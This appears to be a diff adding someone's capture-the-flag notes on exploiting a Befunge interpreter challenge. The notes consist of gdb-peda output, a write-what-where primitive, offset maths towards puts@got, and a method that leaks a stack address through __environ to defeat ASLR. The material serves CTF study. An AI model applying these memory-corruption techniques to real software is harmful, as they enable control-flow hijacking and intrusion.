@@ -1,0 +1,199 @@
+gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : ENABLED
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL
+
+
+25 total commands
+
+program[25][0x50]
+
+0x555555756024 = virtual stack index
+0x555555756040 = program
+0x555555756810 = end
+0x555555756820 = virtual stack
+
+gdb-peda$ x/32xw 0x00005555555554E0
+0x5555555554e0: 0x00000000      0x00000001      0x00000000      0xffffffff
+0x5555555554f0: 0x00000001      0x00000000      0xffffffff      0x00000000
+
+
+gdb-peda$ x/32xg 0x555555756020
+0x555555756020: 0x0000000000000000      0x0000000000000000 <-- vStackIndex
+0x555555756030: 0x0000000000000000      0x0000000000000000
+0x555555756040 <program>:       0x0000000000000039      0x0000000000000000
+0x555555756050 <program+16>:    0x0000000000000000      0x0000000000000000
+
+
+vStack:
+gdb-peda$ x/32xg 0x555555756820
+0x555555756820: 0x0000000000000001      0x0000000000000002 <-- push 1 number per qword
+0x555555756830: 0x0000000000000002      0x0000000000000003
+0x555555756840: 0x0000000000000003      0x0000000000000003
+0x555555756850: 0x0000000000000004      0x0000000000000004
+0x555555756860: 0x0000000000000004      0x0000000000000004
+0x555555756870: 0x0000000000000005      0x0000000000000000
+
+VULNS
+write-what-where
+	- sendCmd('&&&p')
+	  r.sendline(str(0x41414141))
+      r.sendline(str(0x42424242))
+      r.sendline(str(0x43434343))
+
+
+programptr    = 0x555555755FE0
+puts@got   = 0x555555755F50
+
+
+>>> hex(0x10000555555755f50-0x555555755FE0)
+'0xffffffffffffff70L'
+
+0xffffffffffffff70 = (0x50*p1)+p2
+0xffffffffffffff70 = (0x50*0xffffffffb00bface)+p2
+0xffffffffffffff70 = 0xffffffe703be6060+p2
+0x18fc419f10       = p2
+
+
+programptr = 0x555555756040
+putcptr    = 0x555555755F60
+
+>>> hex(0x10000555555755F60-0x555555756040)
+'0xffffffffffffff20L'
+
+0xffffffffffffff20 = (0x50*p1)+p2
+
+LEAKING STACK ADDR FROM __ENVIRON
+=================================
+
+1) __environ variable contains a stack addr!
+	```
+	gdb-peda$ p __environ
+	$22 = (char **) 0x7fffffffdf08
+	
+	
+	gdb-peda$ vmmap 0x7fffffffdf08
+	Start              End                Perm      Name
+	0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
+	```
+
+2) this __environ variable is stored at a fixed offset from libc!
+	```
+	gdb-peda$ find 0x7fffffffdf08 all
+	Searching for '0x7fffffffdf08' in: all ranges
+	Found 3 results, display max 3 items:
+	 mapped : 0x7ffff7dd3f38 --> 0x7fffffffdf08 --> 0x7fffffffe17e ("STY=13981.pts-4.vagrant") <-- this is what we want!
+	 mapped : 0x7ffff7ffe100 --> 0x7fffffffdf08 --> 0x7fffffffe17e ("STY=13981.pts-4.vagrant")
+	[stack] : 0x7fffffffde98 --> 0x7fffffffdf08 --> 0x7fffffffe17e ("STY=13981.pts-4.vagrant")
+
+
+	gdb-peda$ vmmap
+	Start              End                Perm      Name
+	0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so
+	0x00007ffff7bcd000 0x00007ffff7dcd000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so
+	0x00007ffff7dcd000 0x00007ffff7dd1000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so
+	0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so
+	0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p      mapped                              <-- ptr to __environ variable located here!
+	```
+3) we can get the offset of the __environ variable from libc!
+	```
+	gdb-peda$ p 0x7ffff7dd3f38-0x00007ffff7a0d000
+	$26 = 0x3c6f38
+	```
+	environ = libc_base+0x3c6f38
+
+__environ @ 0x7ffff7dd3f38
+`0x100007ffff7dd3f38 - 0x555555756040 = 0x100002aaaa267def8`
+`0x2aaaa267def8 / 0x50 = 0x88886e192f`
+`0x88886e192f*0x50 = 0x2aaaa267deb0`
+
+0x7ffff7dd3f38 = 0x555555756040 + ((x*0x50)+y)
+
+w/ASLR:
+>>> hex(0x100007fff2a99b638-0x557cc4d1dfe0)
+'0x100002a8265c7d658L'
+
+
+run 1:
+```
+gdb-peda$ vmmap
+Start              End                Perm      Name
+0x0000557cc4b1c000 0x0000557cc4b1e000 r-xp      /home/vagrant/CTFs/mmactf16/befunge/befunge
+0x0000557cc4d1d000 0x0000557cc4d1e000 r--p      /home/vagrant/CTFs/mmactf16/befunge/befunge
+0x0000557cc4d1e000 0x0000557cc4d1f000 rw-p      /home/vagrant/CTFs/mmactf16/befunge/befunge
+0x0000557cc4d1f000 0x0000557cc4de2000 rw-p      mapped
+0x00007f3e9317c000 0x00007f3e9333c000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f3e9333c000 0x00007f3e9353c000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f3e9353c000 0x00007f3e93540000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f3e93540000 0x00007f3e93542000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f3e93542000 0x00007f3e93546000 rw-p      mapped
+0x00007f3e93546000 0x00007f3e9356c000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f3e9375b000 0x00007f3e9375e000 rw-p      mapped
+0x00007f3e93769000 0x00007f3e9376b000 rw-p      mapped
+0x00007f3e9376b000 0x00007f3e9376c000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f3e9376c000 0x00007f3e9376d000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f3e9376d000 0x00007f3e9376e000 rw-p      mapped
+0x00007fff2a97b000 0x00007fff2a99c000 rw-p      [stack]
+0x00007fff2a9e2000 0x00007fff2a9e4000 r--p      [vvar]
+0x00007fff2a9e4000 0x00007fff2a9e6000 r-xp      [vdso]
+0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
+
+
+gdb-peda$ p 0x00007f3e9317c000-0x0000557cc4b1c000
+$33 = 0x29c1ce660000
+```
+
+run 2:
+```
+
+
+
+
+gdb-peda$ pdisas 0x000055e4e8e24000+0x10b8
+
+
+
+GOOD RET:
+gdb-peda$ context
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0x7fef53355290 --> 0x3173fffff0013d48 
+RDX: 0x7fef53624780 --> 0x0 
+RSI: 0x0 
+RDI: 0x1 
+RBP: 0x55e66c7d0210 --> 0x495641ff89415741 
+RSP: 0x7ffcd16c4fb8 --> 0x7fef5327e830 --> 0x31000197f9e8c789 
+RIP: 0x55e66c7d020d --> 0xff894157419066c3 
+R8 : 0x7fef5383e700 (0x00007fef5383e700)
+R9 : 0x7fef5383e700 (0x00007fef5383e700)
+R10: 0x0 
+R11: 0x246 
+R12: 0x55e66c7cfa60 --> 0x89485ed18949ed31 
+R13: 0x7ffcd16c5090 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x55e66c7d0207:      pop    r13
+   0x55e66c7d0209:      pop    r14
+   0x55e66c7d020b:      pop    r15
+=> 0x55e66c7d020d:      ret    
+   0x55e66c7d020e:      xchg   ax,ax
+   0x55e66c7d0210:      push   r15
+   0x55e66c7d0212:      mov    r15d,edi
+   0x55e66c7d0215:      push   r14
+[------------------------------------stack-------------------------------------]
+0000| 0x7ffcd16c4fb8 --> 0x7fef5327e830 --> 0x31000197f9e8c789 
+0008| 0x7ffcd16c4fc0 --> 0x1 
+0016| 0x7ffcd16c4fc8 --> 0x7ffcd16c5098 --> 0x7ffcd16c5f94 ("/home/vagrant/CTFs/mmactf16/befunge/befunge")
+0024| 0x7ffcd16c4fd0 --> 0x15384dca0 
+0032| 0x7ffcd16c4fd8 --> 0x55e66c7cfc15 ("AWAVAUATUSH\203ìxdH\213\004%(")
+0040| 0x7ffcd16c4fe0 --> 0x0 
+0048| 0x7ffcd16c4fe8 --> 0x6e78808f61723782 
+0056| 0x7ffcd16c4ff0 --> 0x55e66c7cfa60 --> 0x89485ed18949ed31 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
